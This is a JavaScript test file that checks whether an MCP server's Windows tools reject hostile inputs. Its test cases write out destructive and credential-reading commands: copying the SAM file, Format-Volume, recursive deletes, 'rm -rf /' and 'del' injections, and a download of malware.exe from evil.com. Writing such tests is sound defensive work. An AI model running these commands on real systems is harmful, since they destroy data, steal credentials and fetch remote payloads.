/**
 * @file edge-cases-security.test.js
 * Edge cases and security tests for critical MCP tools
 * Focuses on security boundaries, error handling, and extreme scenarios
 */

const request = require('supertest');

describe('Edge Cases and Security Tests', () => {
  let app;
  let originalEnv;

  beforeAll(() => {
    originalEnv = { ...process.env };
    
    // Configure test environment with security focus
    process.env.MCP_AUTH_TOKEN = 'edge-case-test-token';
    process.env.ALLOWED_IPS = '';
    process.env.ENABLE_DANGEROUS_MODE = 'false'; // Start with security enabled
    process.env.COMMAND_TIMEOUT = '1800000';
    process.env.ALLOWED_BUILD_PATHS = 'C:\\builds\\,C:\\projects\\';
    process.env.ALLOWED_BATCH_DIRS = 'C:\\builds\\;C:\\projects\\';
    process.env.DEV_COMMAND_PATHS = 'C:\\builds\\,C:\\projects\\';
    process.env.ENABLE_DEV_COMMANDS = 'false';
    
    delete require.cache[require.resolve('../server/src/server')];
    app = require('../server/src/server');
  });

  afterAll(() => {
    process.env = originalEnv;
  });

  describe('file_sync Tool Security Tests', () => {
    test('should reject file operations outside allowed paths', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'file_sync',
            arguments: {
              action: 'copy',
              source: 'C:\\Windows\\System32\\config\\SAM',
              destination: 'C:\\builds\\stolen_sam'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('validation failed');
    });

    test('should reject directory traversal attempts', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'file_sync',
            arguments: {
              action: 'copy',
              source: 'C:\\builds\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
              destination: 'C:\\builds\\hosts_copy'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('validation failed');
    });

    test('should handle missing required parameters', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'file_sync',
            arguments: {
              action: 'copy'
              // Missing source and destination
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('required');
    });

    test('should validate allowed actions', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'file_sync',
            arguments: {
              action: 'delete_system32',
              source: 'C:\\Windows\\System32'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('Invalid');
    });
  });

  describe('process_manager Tool Security Tests', () => {
    test('should reject killing critical system processes', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'process_manager',
            arguments: {
              action: 'kill',
              processName: 'csrss.exe'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('not allowed');
    });

    test('should reject starting dangerous executables', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'process_manager',
            arguments: {
              action: 'start',
              processPath: 'C:\\Windows\\System32\\format.com',
              arguments: 'C: /q'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('not allowed');
    });

    test('should handle process listing safely', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'process_manager',
            arguments: {
              action: 'list'
            }
          }
        });

      expect(response.status).toBe(200);
      // Should return process list without sensitive information
    });

    test('should validate process IDs', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'process_manager',
            arguments: {
              action: 'kill',
              processId: 'not-a-number'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('Invalid');
    });
  });

  describe('build_go Tool Edge Cases', () => {
    test('should handle Go module proxy injection attempts', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'build_go',
            arguments: {
              projectPath: 'C:\\projects\\goapp',
              action: 'build',
              env: {
                GOPROXY: 'https://malicious-proxy.com'
              }
            }
          }
        });

      expect(response.status).toBe(200);
      // Should reject or sanitize proxy settings
    });

    test('should handle extremely long package names', async () => {
      const longPackageName = 'github.com/' + 'a'.repeat(300) + '/package';
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'build_go',
            arguments: {
              projectPath: 'C:\\projects\\goapp',
              action: 'get',
              package: longPackageName
            }
          }
        });

      expect(response.status).toBe(200);
      // Should handle or reject gracefully
    });

    test('should validate Go build tags', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'build_go',
            arguments: {
              projectPath: 'C:\\projects\\goapp',
              action: 'build',
              tags: '"; rm -rf /'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('validation');
    });
  });

  describe('Command Injection Prevention Tests', () => {
    test('should prevent command injection in PowerShell', async () => {
      const maliciousCommands = [
        'echo "test"; Format-Volume -DriveLetter C -Force',
        'echo "test" | Out-Null; Remove-Item -Path C:\\* -Recurse -Force',
        '$null; Invoke-WebRequest -Uri "http://evil.com/malware.exe" -OutFile "C:\\malware.exe"',
        'echo test && shutdown /s /t 0'
      ];

      for (const cmd of maliciousCommands) {
        const response = await request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer edge-case-test-token')
          .send({
            method: 'tools/call',
            params: {
              name: 'run_powershell',
              arguments: {
                command: cmd
              }
            }
          });

        expect(response.status).toBe(200);
        expect(response.body.content[0].text).toContain('not allowed');
      }
    });

    test('should prevent batch file command injection', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'run_batch',
            arguments: {
              batchPath: 'C:\\builds\\test.bat & del C:\\*.* /q'
            }
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('validation');
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    test('should limit concurrent build operations', async () => {
      const buildRequests = Array(20).fill(null).map((_, i) =>
        request(app)
          .post('/mcp')
          .set('Authorization', 'Bearer edge-case-test-token')
          .send({
            method: 'tools/call',
            params: {
              name: 'build_go',
              arguments: {
                projectPath: `C:\\projects\\goapp${i}`,
                action: 'build'
              }
            }
          })
      );

      const responses = await Promise.all(buildRequests);
      // Some requests should be rate limited or queued
      const rateLimited = responses.filter(r => 
        r.body.content && r.body.content[0].text.includes('rate')
      );
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should prevent infinite loops in commands', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'run_powershell',
            arguments: {
              command: 'while($true) { Write-Output "Loop" }',
              timeout: 1 // 1 second timeout
            }
          }
        });

      expect(response.status).toBe(200);
      // Should timeout safely
    });
  });

  describe('Dangerous Mode Security Boundaries', () => {
    beforeEach(() => {
      process.env.ENABLE_DANGEROUS_MODE = 'true';
      delete require.cache[require.resolve('../server/src/server')];
      app = require('../server/src/server');
    });

    afterEach(() => {
      process.env.ENABLE_DANGEROUS_MODE = 'false';
    });

    test('should still validate basic security in dangerous mode', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'run_powershell',
            arguments: {} // Missing required command
          }
        });

      expect(response.status).toBe(200);
      expect(response.body.content[0].text).toContain('required');
    });

    test('should show warnings in dangerous mode', async () => {
      const response = await request(app)
        .get('/health');

      expect(response.status).toBe(200);
      expect(response.body.configuration.dangerousMode).toBe(true);
    });
  });

  describe('Input Sanitization Tests', () => {
    test('should sanitize null bytes in input', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'run_powershell',
            arguments: {
              command: 'echo "test\x00malicious"'
            }
          }
        });

      expect(response.status).toBe(200);
      // Should handle null bytes safely
    });

    test('should handle extremely long inputs', async () => {
      const veryLongCommand = 'echo "' + 'A'.repeat(100000) + '"';
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'run_powershell',
            arguments: {
              command: veryLongCommand
            }
          }
        });

      expect(response.status).toBe(200);
      // Should reject or truncate gracefully
    });

    test('should handle special Unicode characters', async () => {
      const response = await request(app)
        .post('/mcp')
        .set('Authorization', 'Bearer edge-case-test-token')
        .send({
          method: 'tools/call',
          params: {
            name: 'file_sync',
            arguments: {
              action: 'copy',
              source: 'C:\\builds\\test\u202E\u0000\u0008.txt',
              destination: 'C:\\builds\\safe.txt'
            }
          }
        });

      expect(response.status).toBe(200);
      // Should sanitize dangerous Unicode
    });
  });
});